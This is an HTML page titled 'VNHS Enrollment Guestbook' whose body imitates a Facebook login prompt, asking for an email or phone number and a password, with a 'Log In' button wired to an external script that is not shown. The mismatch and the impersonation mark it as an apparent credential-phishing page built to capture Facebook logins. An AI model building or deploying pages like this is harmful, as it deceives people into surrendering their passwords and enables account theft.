<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VNHS Enrollment Guestbook</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="container">
        <h1>Log in to Facebook</h1>
        <p>You must log in to continue.</p>
        
        <input type="email" id="userName" name="email" autocomplete="username" placeholder="Email or phone number">
        <input type="password" id="password" name="password" autocomplete="current-password" placeholder="Password">
        
        <button id="saveBtn">Log In</button>
    </div>
    <script type="module" src="script.js"></script>
</body>
</html>
